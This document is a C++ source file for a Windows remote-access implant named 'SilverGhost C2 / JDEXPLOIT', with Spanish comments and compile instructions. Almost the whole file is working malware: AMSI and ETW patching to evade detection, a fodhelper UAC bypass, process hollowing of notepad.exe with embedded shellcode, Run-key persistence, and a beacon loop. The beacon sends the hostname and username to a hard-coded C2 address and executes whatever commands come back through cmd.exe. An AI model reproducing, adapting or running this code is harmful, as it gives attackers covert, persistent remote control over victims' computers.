/*
 * SilverGhost C2 - JDEXPLOIT ARSENAL v3.0 (FIXED COMPILATION)
 * Compilación: x86_64-w64-mingw32-g++ -O2 -s -static -mwindows -o JDEXPLOIT_v3.exe silverghost_fixed.cpp -lwininet -lws2_32 -ladvapi32 -lshell32 -lcrypt32 -lole32 -luuid
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shellapi.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")

// --- CONFIGURACIÓN JDEXPLOIT ---
#define C2_SERVER L"192.168.254.147"
#define C2_PORT 443
#define AES_KEY "JDEXPLOIT2024!!!"
#define AES_BLOCK_SIZE 16  // AES block size is always 16 bytes

// --- PAYLOAD x64 (calc.exe) ---
BYTE x64_payload[] = {
    0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
    0x56,0x48,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,
    0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,0x31,0xC0,
    0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,
    0x52,0x41,0x51,0x48,0x8B,0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,
    0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,0x8B,0x48,0x18,0x44,
    0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,
    0x01,0xD6,0x4D,0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,
    0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,0x39,0xD1,0x75,0xD8,0x58,0x44,
    0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,
    0x01,0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,
    0x41,0x58,0x41,0x59,0x41,0x5A,0x48,0x83,0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,
    0x59,0x5A,0x48,0x8B,0x12,0xE9,0x57,0xFF,0xFF,0xFF,0x5D,0x48,0xBA,0x01,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x48,0x8D,0x8D,0x01,0x01,0x00,0x00,0x41,0xBA,0x31,0x8B,
    0x6F,0x87,0xFF,0xD5,0xBB,0xE0,0x1D,0x2A,0x0A,0x41,0xBA,0xA6,0x95,0xBD,0x9D,0xFF,
    0xD5,0x48,0x83,0xC4,0x28,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,0x05,0xBB,0x47,
    0x13,0x72,0x6F,0x6A,0x00,0x59,0x41,0x89,0xDA,0xFF,0xD5,0x63,0x61,0x6C,0x63,0x2E,
    0x65,0x78,0x65,0x00
};

// --- PROTOTIPOS NTAPI (CORREGIDOS) ---
typedef LONG NTSTATUS;
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* _NtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* _NtGetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS(NTAPI* _NtSetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS(NTAPI* _NtResumeThread)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI* _NtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef NTSTATUS(NTAPI* _RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

// --- FUNCIONES AUXILIARES ---
std::string b64encode(const std::vector<BYTE>& data) {
    static const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    int val = 0, valb = -6;
    for (BYTE c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            result.push_back(chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (result.size() % 4) result.push_back('=');
    return result;
}

// --- Process Hollowing Funcional ---
BOOL EnablePrivilege(LPCSTR privName) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    
    if (!LookupPrivilegeValueA(NULL, privName, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return result && GetLastError() == ERROR_SUCCESS;
}

void NativeProcessHollowing() {
    EnablePrivilege("SeDebugPrivilege");
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    _NtReadVirtualMemory NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    _NtGetContextThread NtGetContextThread = (_NtGetContextThread)GetProcAddress(ntdll, "NtGetContextThread");
    _NtSetContextThread NtSetContextThread = (_NtSetContextThread)GetProcAddress(ntdll, "NtSetContextThread");
    _NtResumeThread NtResumeThread = (_NtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    NtGetContextThread(pi.hThread, &ctx);
    
    PVOID imageBase = NULL;
    SIZE_T bytesRead;
    NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(PVOID), &bytesRead);
    
    NtUnmapViewOfSection(pi.hProcess, imageBase);
    
    SIZE_T shellSize = sizeof(x64_payload);
    PVOID remoteBase = NULL;
    NtAllocateVirtualMemory(pi.hProcess, &remoteBase, 0, &shellSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(pi.hProcess, remoteBase, x64_payload, shellSize, &bytesRead);
    
    ctx.Rip = (DWORD64)remoteBase;
    NtSetContextThread(pi.hThread, &ctx);
    NtResumeThread(pi.hThread, NULL);
}

// --- UAC Bypass Silencioso (Fodhelper) ---
void SilentUACBypass() {
    HKEY hKey;
    DWORD dwDisposition;
    
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", 
                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS) {
        
        char payloadPath[MAX_PATH];
        GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
        std::string cmd = "cmd.exe /c start " + std::string(payloadPath);
        
        RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)cmd.c_str(), cmd.length());
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
        RegCloseKey(hKey);
        
        ShellExecuteA(NULL, "open", "fodhelper.exe", NULL, NULL, SW_HIDE);
        Sleep(3000);
        RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command");
    }
}

// --- AES-256 CBC con PKCS7 + Base64 ---
std::string AESEncryptToBase64(const std::string& data) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    std::vector<BYTE> encrypted;
    
    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        HCRYPTHASH hHash;
        if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            CryptHashData(hHash, (BYTE*)AES_KEY, strlen(AES_KEY), 0);
            CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
            
            DWORD mode = CRYPT_MODE_CBC;
            CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
            
            BYTE iv[16] = { 0 };
            CryptSetKeyParam(hKey, KP_IV, iv, 0);
            
            DWORD dataLen = data.size();
            DWORD padLen = AES_BLOCK_SIZE - (dataLen % AES_BLOCK_SIZE);
            std::string padded = data + std::string(padLen, (char)padLen);
            
            DWORD totalLen = padded.size();
            encrypted.resize(totalLen);
            memcpy(encrypted.data(), padded.c_str(), totalLen);
            
            CryptEncrypt(hKey, 0, TRUE, 0, encrypted.data(), &dataLen, totalLen);
            encrypted.resize(dataLen);
            
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
    return b64encode(encrypted);
}

// --- Beacon C2 ---
void Beacon() {
    HINTERNET hSession = InternetOpenW(L"JDEXPLOIT/3.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) return;
    
    char hostname[256], username[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    size = sizeof(username);
    GetUserNameA(username, &size);
    
    while (true) {
        HINTERNET hConn = InternetConnectW(hSession, C2_SERVER, C2_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConn) {
            HINTERNET hReq = HttpOpenRequestW(hConn, L"POST", L"/api/beacon", NULL, NULL, NULL, 
                                             INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION, 0);
            if (hReq) {
                std::string json = "{\"host\":\"" + std::string(hostname) + "\",\"user\":\"" + std::string(username) + "\"}";
                std::string encData = AESEncryptToBase64(json);
                
                HttpSendRequestA(hReq, "Content-Type: text/plain\r\n", -1, (LPVOID)encData.c_str(), encData.length());
                
                char buffer[4096] = { 0 };
                DWORD bytesRead = 0;
                if (InternetReadFile(hReq, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                    STARTUPINFOA si = { sizeof(si) };
                    PROCESS_INFORMATION pi;
                    si.dwFlags = STARTF_USESHOWWINDOW;
                    si.wShowWindow = SW_HIDE;
                    std::string cmd = "cmd.exe /c " + std::string(buffer, bytesRead);
                    CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                    WaitForSingleObject(pi.hProcess, 5000);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                InternetCloseHandle(hReq);
            }
            InternetCloseHandle(hConn);
        }
        Sleep(5000 + (rand() % 3000));
    }
    InternetCloseHandle(hSession);
}

// --- Patches AMSI/ETW ---
void PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi) {
        BYTE* pAmsiScanBuffer = (BYTE*)GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (pAmsiScanBuffer) {
            DWORD oldProtect;
            VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
            BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            memcpy(pAmsiScanBuffer, patch, sizeof(patch));
            VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
        }
    }
}

void DisableETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        BYTE* pNtTraceEvent = (BYTE*)GetProcAddress(hNtdll, "NtTraceEvent");
        if (pNtTraceEvent) {
            DWORD oldProtect;
            VirtualProtect(pNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
            *pNtTraceEvent = 0xC3;
            VirtualProtect(pNtTraceEvent, 1, oldProtect, &oldProtect);
        }
    }
}

// --- Entry Point ---
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    if (GetTickCount64() < 600000) Sleep(600000 - GetTickCount64());
    
    PatchAMSI();
    DisableETW();
    SilentUACBypass();
    NativeProcessHollowing();
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        RegSetValueExA(hKey, "JDEXPLOIT_SilverGhost", 0, REG_SZ, (BYTE*)path, strlen(path));
        RegCloseKey(hKey);
    }
    
    Beacon();
    return 0;
}
